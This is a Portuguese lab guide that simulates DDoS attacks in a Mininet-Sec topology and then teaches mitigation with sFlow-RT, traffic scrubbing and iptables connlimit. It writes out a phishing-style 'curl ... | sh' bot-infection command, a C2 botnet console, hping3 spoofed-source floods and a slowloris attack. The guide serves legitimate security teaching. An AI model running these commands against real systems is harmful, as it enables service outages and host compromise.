# Roteiro de Laboratório - DDoS Ataques de Negação de Serviço Distribuídos

Neste laboratório vamos explorar os ataques de negação de serviço distribuídos, ou simplesmente **DDoS** (do inglês _Distributed Denial of Service_), cujo objetivo geral é indisponibilizar um serviço, usuário ou aplicação através do envio de tráfego malicioso originado em fontes distribuídas ou diversas. Existem diversos tipos de ataques DDoS, destacando-se: DDoS volumétrico; DDoS refletido e amplificado; e _Slow DDoS_. Alguns autores propõem classificações adicionais/diferentes, portanto a lista acima apresenta alguns tipos mais comuns e que serão explorados neste laboratório.

O cenário utilizado para esse laboratório é ilustrado na figura abaixo:

![Topology](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/topology.png)

Nesse cenário, uma organização fictícia que hospeda o site "HackInSDN.com" será vítima de ataques de negação de serviço distribuídos, tendo como alvo principal o servidor **srv1** que hospeda o site da organização. O atancante orquestra os ataques através do host **c2c** (ou C&C, do inglês _Command and Control_) que gerencia uma botnet de hosts comprometidos (h2, h4, h5, h6, h8 e h9) utilizados para disparar de fato o ataque. Clientes legítimos como o host **h1** (e também h3 e h7) serão afetados pelo ataque e observarão impacto na disponibilidade do site. Além do processo de orquestração e execução do ataque, este experimento também ilustra técnicas para detecção e contenção de tais ataques.

## Atividade 1 - Testes de funcionamento normal do cenário

Antes de iniciar o cenário de orquestração, execução e contenção dos ataques de DDoS, vamos fazer alguns testes de acesso ao ambiente e configurar a conectividade dos hosts.

1. O primeiro passo é verificar a conectividade entre o host **h1** e o servidor **srv1**. Para isso, abra o Mininet-Sec conforme ilustrado na imagem abaixo:

![lab04-ddos-resources-dashboard-mnsec.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-resources-dashboard-mnsec.png)

Você deve observar que uma nova aba no navegador é aberta com a topologia do Mininet-Sec conforme ilustrado abaixo:

![lab04-ddos-mnsec-topo.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-mnsec-topo.png)

Nessa tela, faça um duplo clique no host **h1** e observe que uma nova aba será aberta com o terminal do h1.

No terminal do h1, execute um teste de conectividade para o srv1 com o comando ping:
```
ping -c4 192.168.1.254
```

Observe que o retorno do teste será uma falha indicando que o host está inalcançável, conforme ilustrado abaixo:

![lab04-ddos-h1-ping-srv1-fail.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h1-ping-srv1-fail.png)

Essa falha ocorre pois precisamos configurar o controlador SDN para fornecer conectividade entre os hosts.

2. Para configurar a conectivdade entre os hosts da organização HackInSDN.com, vamos utilizar uma aplicação simples no Orquestrador SDN Kytos-ng que funciona como [Switch L2](https://github.com/kytos-ng/of_l2ls/). Para isso, abra o terminal do host **c1** na topologia do Mininet-Sec com um duplo clique e execute os seguintes comandos:

```
ip netns exec mgmt python3 -m pip install -e git+https://github.com/kytos-ng/of_l2ls#egg=kytos-of-l2ls
```

E então entre com os seguintes comandos para reiniciar o Kytos:
```
tmux send-keys -t kytos "exit" ENTER
sleep 5
pkill -9 kytosd
tmux new-session -d -s kytosserver "kytosd -f -E"
```

3. De volta ao terminal do host **h1** execute novamente o teste de PING e observe agora a conectividade está operacional:
```
ping -c4 192.168.1.254
```

A saída esperada é mostrada abaixo. É possível que o primeiro pacote seja "perdido" pois o controlador SDN Kytos precisa de um tempo para fazer a descoberta da porta e configuração das regras OpenFlow.

![lab04-ddos-h1-ping-srv1-ok.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h1-ping-srv1-ok.png)

4. Ainda no host **h1**, execute também um teste de acesso ao site do HackInSDN.com na linha de comando com o seguinte comando:
```
curl http://192.168.1.254
```

A saída esperada é mostrada abaixo:

![lab04-ddos-h1-curl-ok.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h1-curl-ok.png)


5. Ainda no host **h1**, vamos utilizar uma ferramenta de teste contínuo e _benchmarking_ para as requisições HTTP. A ferramenta utilizada será o **ali** (https://github.com/nakabonne/ali), que pode ser executada com o seguinte comando no terminal do host h1:
```
ali --timeout 2s --duration 0 http://192.168.1.254
```

Após executar o comando acima, você deve pressionar a tecla ENTER para iniciar o processo de coleta. A saída esperada do ali é mostrada abaixo:

![lab04-ddos-h1-ali.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h1-ali.png)

6. Por fim, vamos também executar uma ferramenta de coleta de estatísticas do tráfego de rede. Essas estatísticas serão utilizadas ao longo desse laboratório para entender o comportamento dos ataques. Para monitorar as estatísticas de rede, abro o terminal do Mininet-Sec na interface do Dashboard, conforme mostrado abaixo:

![lab04-ddos-resources-dashboard-term-mnsec.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-resources-dashboard-term-mnsec.png)

No terminal do Mininet-Sec, rodar o comando dstat:

```
dstat --bits -t -n -N s1-eth8
```

A saída esperada é mostrada abaixo:

![lab04-ddos-mnsec-dstat.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-mnsec-dstat.png)

O comando acima irá monitorar as estatísticas de rede da interface **s1-eth8** que deve ser a interface conectando o switch **s1** com o host **srv1**.

Ao observar a saída acima podemos notar que o tráfego enviado gira em torno de 80Kbps e o tráfego recebido gira em torno de 140Kbps. O tráfego em questão é resultante do benchmark executado pela ferramenta "ali" que gera cerca de 50 requisições por segundo, resultando em um tráfego enviado de 80Kbps, sendo a resposta com o conteúdo HTML correspondente ao tráfego recebido de 140Kbps.

Por fim, caso você deseje confirmar que a interface **s1-eth8** é a interface correta que conecta **s1** e **srv1**, volte para a aba que mostra a topologia do Mininet-Sec e clique no link entre os dois elementos:

![lab04-ddos-mnsec-link-s1-srv1.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-mnsec-link-s1-srv1.png)


## Atividade 2 - Orquestrando a formação da botnet

Para executar um ataque de DDoS, tipicamente os atacacantes lançam mão de uma **botnet** que trabalha de forma orquestrada para remotamente disparar um envio em massa de requisições maliciosas para indisponibilizar um serviço. Uma botnet é uma rede formada por centenas/milhares de bots, ou computadores **zumbis**, que consistem em dispositivos conectados à Internet que estão infectados com malware e podem ser controlados remotamente para disparar ataques, potencializando a ação danosa dos atacantes. A botnet possui um Controlador, também conhecido como **master** ou **C&C** (ou também c2c), que é um computador utilizado para orquestrar o funcionamento dos **zumbis** ou **bots** para realizar determinado ataque. Nessa seção, vamos ilustrar o processo de formação da botnet e o funcionamento do C&C.

1. Para fins didáticos e ilustrativos, este laboratório inclui um sistema de Controlador da Botnet, que pode ser acessado através do link do serviço "http c2c" no Dashboard:

![lab04-ddos-resources-dashboard-c2c.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-resources-dashboard-c2c.png)

Ao carregar a página do controlador, você visualizará um conteúdo similar ao mostrado abaixo:

![lab04-ddos-c2c-phishing.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-phishing.png)

Essa é uma página ilustrativa com um golpe de fraude eletrônica (_Phishing_) que visa iludir o usuário a acreditar que está instalando um software seguro mas está instalando na verdade um malware, transformando seu computador em um **bot**. Para isso, a página instrui o usuário a copiar e executar um comando no seu computador (**Atenção:** este é um dos riscos de instalar software de procedência desconhecida, ou executar comandos em sites sem confiança).

Em particular, no cenário ilustrativo e didático desse laboratório, vamos assumir que algumas pessoas foram vítimas desse golpe e vamos simular dois computadores sendo também infectados.

2. Volte ao Dashboard HackInSDN e clique novamente no serviço "http c2c" para abrir uma nova aba. Dessa vez, na aba aberta, modifique a URL e adicione um /admin no final. Deve aparecer uma tela solicitando login e senha, logar com usuario "admin" e senha "hackinsdn". Abaixo uma ilustração:

![lab04-ddos-c2c-admin-login.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-admin-login.png)

3. Na tela seguinte você visualizará um suposto console do C&C, onde pode verificar uma tabela com hosts infectados e que atuam como **bots** nessa botnet fictícia:

![lab04-ddos-c2c-admin-view.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-admin-view.png)

Faça o refresh da página e observe que a coluna "Last seen" indica que os bots estão online e se comunicando com o c2c.

4. Em seguida vamos realizar um teste para comprovar que os hosts da botnet podem ser utilizados para efetur ataques de forma didática e ilustrativa. Para isso vamos utilizar o simples comando ping e visualizar o volume gerado pelos hosts infectados. Ainda na interface admin da console c2c preencha os campos abaixo:

- When: **30**
- Task:
```
timeout 60 ping -s 972 192.168.1.254
```
- Em seguida clique em "Submit"

Abaixo uma ilustração:

![lab04-ddos-c2c-admin-create-tasks.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-admin-create-tasks.png)

Em seguida, recarregue a página e observe que todos os **bots** já obtiveram a tarefa e vão iniciar a execução em alguns segundos.

![lab04-ddos-c2c-admin-zumbie-tasks.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-admin-zumbie-tasks.png)

5. Volte à aba que estava mostrando as estatísticas de tráfego com DSTAT e observe que a média de tráfego recebido e enviado aumentou em cerca de 30Kbps cada (passando de 140Kbps para 170Kbps e 80 para 110Kbps, respectivamente):

![lab04-ddos-mnsec-dstat-task-ping.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-mnsec-dstat-task-ping.png)

Isso ocorre pois cada **bot** envia 1000 bytes (972 do payload ICMP + 8 dos cabeçalhos ICMP + 20 dos cabeçalhos IP) e temos 4 **bots** ativos: 1000 x 4 x 8 = 32000 bps ou 30Kbps.

6. Em seguida vamos ilustrar o processo de infecção de um host. Para issu acesse o terminal do h6 com um duplo clique sobre o h6 na topologia do Mininet-Sec. Vamos assumir que o usuário que estava no h6 acreditou no site de phishing da botnet, copiou o comando e executou na sua máquina. No terminal do h6 execute o seguinte comando:

```
curl -sfL http://192.168.1.250:5000/s/download-vpn | sh
```

Saída esperada é mostrada abaixo:

![lab04-ddos-host-infection-h6.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-host-infection-h6.png)

Na console admin do c2c, após um refresh da página podemos visualizar que o h6 agora também faz parte da botnet:

![lab04-ddos-c2c-h6-zumbi.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-h6-zumbi.png)

Ainda no terminal do h6, liste os processos em execução com o seguinte comando:
```
ps aux
```

A saída esperada é ilutrada a seguir:

![lab04-ddos-list-processes-infected-host.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-list-processes-infected-host.png)

A lista de processos acima levanta alguma suspeita?


6. Repetir o mesmo processo com o h8. A partir do terminal do host h8, executar:

```
curl -sfL http://192.168.1.250:5000/s/download-vpn | sh
```

7. De volta a aba da console admin do C2C, repita o teste de ping para visualizar o volume gerado pelos hosts infectados:

- When: `30`
- Task: `timeout 60 ping -s 972 192.168.1.254`

Na tela do DSTAT, observe agora o volume de tráfego subindo para algo em torno de 225Kbps de saída e 140Kbps de entrada

## Atividade 3 - Executando ataques de DDoS volumétrico

1. Como já observamos anteriormente, as estatísticas de rede com a ferramenta DSTAT mostram que em consições normais o volume de tráfego do host **srv1** gira em torno de 140Kbps de saída e 80Kbps de entrada. O volume está baixo e em conformidade com o uso da ferramenta de benchmark "ali". Confirme a visualização das estatísticas no terminal do Mininet-Sec que está executando o comando "dstat".

2. Volte a interface console admin C2C e confirme que todos os hosts infectados continuam ativos, você deve visualizar 6 bots ativos (h2, h4, h5, h6, h8, h9) -- observe os endereços IPs especialmente o último octeto e também a coluna "Last seen".

3. Na seção de Tasks, cadastrar uma nova Task para executar um ataque de DDoS volumétrico pelos **bots**:

- When: `30`
- Task:
```
timeout 120 hping3 -d 1200 -p 80 -i u250 --rand-source 192.168.1.254
```

O comando acima vai executar um volume de tráfego muito grande a partir de cada bot. Além disso, os endereços IPs do tráfego serão aleatórios dificultando as ações de segurança.

4. Na aba com o DSTAT, observar o volume de tráfego gerado para o srv1:

![lab04-ddos-dstat-ddos-vol.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-dstat-ddos-vol.png)

5. Na aba do h1 que está com o "ali" em execução, observar as requisições com falha de timeout:

![lab04-ddos-ali-timeout.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-ali-timeout.png)

6. No host h8, executar o seguinte comando para listar os processos e observar o resultado:

```
ps aux
```

A saída esperada é mostrada abaixo:

![lab04-ddos-h8-ps-aux.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h8-ps-aux.png)

Note que não aparece o hping3 na lista de processos em execução, mas sim um processo chamado "linux\_checker" o que pode confundir e dificultar a detecção do host comprometido pelo administrador:

## Atividade 4 - Mitigando ataques de DDoS volumétrico com bloqueio de atacantes

A mitigação de ataques de DDoS visa minimizar ou aliviar os efeitos danosos de um ataque de negação de serviço para reduzir os impactos causados. A mitigação de um ataque de DDoS pode não significar que cessar o ataque por completo, mas sim reduzir os impactos para níveis aceitáveis pela organização. O processo de mitigação pode envolver diversas estratégias, porém as mais comuns são: criação de filtros para bloqueio dos atacantes (também conhecido como _blackhole_), restrição de banda para redução dos impactos (_rate limit_), soluções de limpeza de tráfego e planos de contingência com movimentação do alvo do ataque (exemplo: migração de serviço). Nesse laboratório vamos explorar a mitigação dos ataques através do bloqueio simples (_blackhole_).

1. Abrir o terminal do Mininet-Sec a partir do dashboard:

![lab04-ddos-resources-dashboard-term-mnsec.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-resources-dashboard-term-mnsec.png)

2. A partir do terminal do Mininet-Sec, instalar o Sflow-RT:

```
apt-get update && apt-get install --no-install-recommends -y default-jre
curl -sfL https://inmon.com/products/sFlow-RT/sflow-rt.tar.gz | tar -xz -C /opt/
```

3. Instalar a aplicação "HackInSDN Anti-DDoS" e a aplicação "Browse and trend traffic flows" no Sflow-RT.

Para instalar a aplicação hackinsdn-anti-ddos:
```
/opt/sflow-rt/get-app.sh hackinsdn hackinsdn-anti-ddos
```

Para instalar a aplicação browse-flows:
```
/opt/sflow-rt/get-app.sh sflow-rt browse-flows
```

4. Iniciar o Sflow-RT:

```
/opt/sflow-rt/start.sh
```

Saída esperada:

![lab04-ddos-start-sflow-rt.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-start-sflow-rt.png)

5. Agora vamos executar novamente o ataque de DDoS volumétrico contra o servidor web da organização HackInSDN.com. Na aba que possui o console admin do C2C aberto, adicionar uma nova Task para executar em 30 segundos e com o comando:

```
timeout 60 hping3 -d 1200 -p 80 -i u250 --rand-source 192.168.1.254
```

6. Na aba do terminal do MininetSec que estava executando o Sflow-RT, observe a saída:

![lab04-ddos-sflow-rt-detect.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-sflow-rt-detect.png)

7. Na aba que mostra a ferramenta "ali" executando um benchmark a partir de cliente legítimo h1, note que o acesso continua sendo impactado:

![lab04-ddos-ali-impacted-sflow-rt.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-ali-impacted-sflow-rt.png)

8. Observe que o ataque foi detectado porém a aplicação HackInSDN Anti-DDoS estava configurada de forma a não realizar a mitigação automática. Para visualizar as configurações da aplicação HackInSDN Anti-DDoS, abra um novo terminal do Mininet-Sec a partir do Dashboard e execute o seguinte comando no terminal do Mininet-Sec:

```
curl -s http://127.0.0.1:8008/app/hackinsdn-anti-ddos/scripts/main.js/json | jq -r
```

A saída esperada é mostrada a seguir:

![lab04-ddos-hackinsdn-anti-ddos-settings.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-hackinsdn-anti-ddos-settings.png)

Observe que a ação de mitigação está configurada como "none", o que significa que nenhuma ação será tomada.

9. Aguarde alguns segundos até o ataque finalizar.

10. Altere a ação de mitigação para DROP, descartando o tráfego malicioso:

```
curl -X POST -H 'Content-type: application/json' -s http://127.0.0.1:8008/app/hackinsdn-anti-ddos/scripts/main.js/json -d '{"action": "drop"}' | jq -r
```

11. Repita novamente a execução do ataque a partir do console admin do C2C porém agora com uma duração maior (tempo para início do ataque: 30 segundos):

```
timeout 120 hping3 -d 1200 -p 80 -i u250 --rand-source 192.168.1.254
```

12. Obseve a saída do Sflow-RT:

![lab04-ddos-sflow-rt-mitigate.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-sflow-rt-unblock.png)

13. Observe agora o funcionamento de um cliente legítimo h1 executando o benchmark com a ferramenta "ali":

![lab04-ddos-ali-ok-sflow-rt.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-ali-ok-sflow-rt.png)

14. No cenário acima, clientes legítimos que de alguma forma compartilham infraestrutura de rede com atacantes (cenário muitíssimo comum) também seriam impactados. Podemos comprovar essa observação, executaremos um teste de acesso web a partir do host h3 que compartilha infraestrutura de redes com hosts notodamente infectados (i.e, h2 e h4).

Abra o terminal do h3 e execute o seguinte comando:

```
curl --max-time 10 http://192.168.1.254
```

A saída esperada é mostrada abaixo:

![lab04-ddos-h3-timeout.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h3-timeout.png)

15. Aguarde o fim do ataque e observe que o Sflow-RT automaticamente remove o bloqueio:

![lab04-ddos-sflow-rt-unblock.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-sflow-rt-unblock.png)

16. Teste novamente o acesso a partir dos clientes legítimos h3 e h1 através do seguinte comando:

```
curl --max-time 10 http://192.168.1.254
```

## Atividade 5 - Mitigando ataques de DDoS volumétrico com limpeza de tráfego

Na seção anterior foi possível observar que o ataque foi mitigado e o sistema passou a funcionar apesar do ataque, porém clientes legítimos que compartilham infraestrutura com atacantes foram impactados. A técnica de bloqueio de tráfego pode ser combinada com filtros que permitem bloquear o tráfego em pontos estratégicos, como tráfego internacional, tráfego vindo de determinado ponto de tráfego, entre outros; tudo depende das funcionalidades previstas no seu provedor de Internet. Outra opção seria as técnicas de **limpeza de tráfego**, que, a partir de alguma heurística, removem o tráfego de ataque ou tráfego malicioso e encaminham para o cliente apenas o tráfego benígno. Existem empresas que fornecem esse tipo de serviço a partir de diferentes estratégias (https://imasd.lacnic.net/reportes/ciberseguridad/soluciones-anti-ddos-existentes-mercado-pt.pdf). Nesta seção vamos ilustrar uma solução simplificada de limpeza de tráfego.

1. No terminal do Mininet-Sec, altere o tipo de bloqueio com o seguinte comando:

```
curl -X POST -H 'Content-type: application/json' -s http://127.0.0.1:8008/app/hackinsdn-anti-ddos/scripts/main.js/json -d '{"action": "redirect", "redirect_to": 20}' | jq -r
```

A porta 20, em particular, é a porta na qual o servidor de limpeza de tráfego está conectado. A ideia é que o tráfego será encaminhado para essa porta 20, o servidor de limpeza de tráfego irá remover o tráfego malicioso e permitir apenas o tráfego legítimo. No passo seguinte vamos configurar o servidor de limpeza de tráfego.


2. Abra o terminal do srv2 para configurarmos o servidor de limpeza de tráfego. A estratégia de limpeza de tráfego será bem simplificada: vamos permitir o tráfego a partir de uma lista de IPs confiáveis, e descartar todo tráfego adicional. Para isso execute os seguintes comandos no servidor srv2:

Primeiro vamos preparar o servidor de limpeza:
```
ip link add br0 type bridge
ip link set srv2-eth0 master br0
ip link set srv2-eth1 master br0
ebtables -A FORWARD --pkttype multicast -j DROP
ebtables -A FORWARD --pkttype broadcast -j DROP
ip link set br0 up
```

Em seguida vamos configurar as regras de filtragem que permitem o tráfego de IPs confiáveis e bloqueiam todo tráfego adicional:
```
iptables -P FORWARD DROP
iptables -A FORWARD -i br0 -s 192.168.1.0/24 -j ACCEPT
```

3. Repita novamente a execução do ataque a partir do console admin do C2C:

- when: 30
- task:
```
timeout 120 hping3 -d 1200 -p 80 -i u250 --rand-source 192.168.1.254
```

4. Obseve a saída do Sflow-RT:

![lab04-ddos-sflow-rt-block-redirect.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-sflow-rt-block-redirect.png)

5. Observe agora o funcionamento de um cliente legítimo que compartilha infraestrutura de rede com clientes infectados. Para isso, navegue novamente para o terminal do h3 e execute o seguinte comando:

```
curl --max-time 10 http://192.168.1.254
```

A saída esperada é mostrada abaixo:

![lab04-ddos-h3-ok.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h3-ok.png)

6. Observe também a saída da ferramenta "ali" e observe que as requisições continuam sendo tratadas normalmente apesar do pico:

![lab04-ddos-ali-ok-redirect.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-ali-ok-redirect.png)

## Atividade 6 - Executando ataques de Slow DDoS

Ataques de Slow DDoS ou Low DDoS, que em português podemos traduzir como ataques de DDoS de baixa volumetria, são ataques cujo objetivo continua sendo indisponibilizar serviços e sistemas a partir de origens distribuídas porém utilizando um baixo volume de requisições ou requisições com ritmo muito mais lento que o uso típico. Tais ataques têm como alvo servidores que tratam as requisições a partir de um conjunto de recursos, por exemplo um _pool_ de _threads_ em um servidor web, de forma que multiplas requisições malignas sejam atreladas a cada uma dessas _threads_ e enviem requisições muito lentamente para manter o recurso ocupado e indisponível para usuários legítimos. Os atacantes podem usar cabeçalhos HTTP, requisições HTTP POST, tráfego TCP, entre outros, para efetivar os ataques de Slow DDoS. Alguns exemplos desses ataques incluem: [Slowloris](https://www.akamai.com/pt/glossary/what-is-a-slowloris-ddos-attack) -- envio parcial e lento de cabeçalhos HTTP; [R.U.D.Y.](https://www.imperva.com/learn/ddos/rudy-r-u-dead-yet/) (R-U-DEAD-YET?) -- baseado no envio de requisições HTTP POST para formulários; [Sockstress](https://en.wikipedia.org/wiki/Sockstress) -- explora uma vulnerabilidade do TCP 3-way handshake para criar conexões que nunca finalizam. Neste laboratório vamos explorar o ataque Slowloris.

1. Na aba do terminal do Mininet-Sec que está executando o **dstat**, checar que o volume está baixo e em conformidade com o uso da ferramenta "ali"

2. Recarregar a interface do C2C e checar que todos os hosts infectados continuam ativos

3. Na seção de Tasks, cadastrar uma nova Task para executar em 30 segundos com o seguinte comando:

```
timeout 120 slowloris -s 100 -p 80 --randuseragents 192.168.1.254
```

4. Observar o volume de tráfego gerado para o srv1 a partir da ferramenta **dstat** no terminal do Mininet-Sec:

![lab04-ddos-dstat-slowloris.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-dstat-slowloris.png)

5. Observe que o volume de tráfego gerado é muito menor que no caso anterior. Nesse caso, ferramentas de detecção de ataques, como a aplicação HackInSDN Anti-DDoS no Sflow-RT, e muitas outras não são capazes de facilmente detectar o ataque. Por outro lado, os clientes legítimos são impactados de forma ainda mais significativa. Para observar esse fato, a aba do h1 que está com o "ali" em execução, observar as requisições com falha de timeout:

![lab04-ddos-ali-slowloris.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-ali-slowloris.png)

6. Aguarde alguns segundos até a finalização do ataque e observe que o benchmark na ferramenta "ali" no host h1 foi normalizado.

## Atividade 7 - Mitigando ataques de Slow DDoS

Nesta atividade vamos ilustrar a mitigação do ataque de Slow DDoS, motrado na seção anterior, a partir de limitação de banda com o IPTables. É importante ressaltar que a estratégia ilustrada nessa seção tem uma finalidade meramente didática, portanto a abordagem de mitigação a ser escolhida e implantada em produção deve ser cuidadosamente avaliada, sob o risco de impactar requisições legítimas dependendo da volumetria de tráfego legítimo. Outras soluções mais robustas podem ser encontradas na literatura e nas aplicações comerciais. Recomendamos a leitura das referências a seguir para maiores informações: [Detection and Mitigation of Low-Rate Denial-of-Service Attacks: A Survey](https://ieeexplore.ieee.org/abstract/document/9830749), [Mitigando a Ameaça dos Ataques Slow DDoS a Redes SDN usando Consolidação de Regras](https://sol.sbc.org.br/index.php/sbseg/article/view/27214) e [Mitigate Slow HTTP GET/POST Vulnerabilities in the Apache HTTP Server](https://www.acunetix.com/blog/articles/slow-http-dos-attacks-mitigate-apache-http-server/).

1. No terminal do servidor srv1, aplicar configurações de limitação de banda para evitar as requisições potencialmente maliciosas:

```
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 15 --connlimit-mask 32 -j REJECT --reject-with tcp-reset
```

No comando acima estamos utilizando a extensão "connlimit" do IPTables/Netfilter para descartar (via TCP reset) requisições originadas pelo mesmo IP (`--connlimit-mask 32`) que excedam um máximo de 15 conexões simultâneas (`--connlimit-above 15`). É importante observar que clientes legítimos tipicamente tentarão reconectar e obter o recursos desejado novamente ao receber um TCP reset, ao passo que o atacante perde a característica principal que é manter um grande volume de conexões simultâneas ocupando todas as threads do servidor.

3. Repetir os testes da seção anterior (o ataque e também o monitoramento do "ali") e avaliar os resultados.

![lab04-ddos-ali-mitigate-slowloris.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-ali-mitigate-slowloris.png)
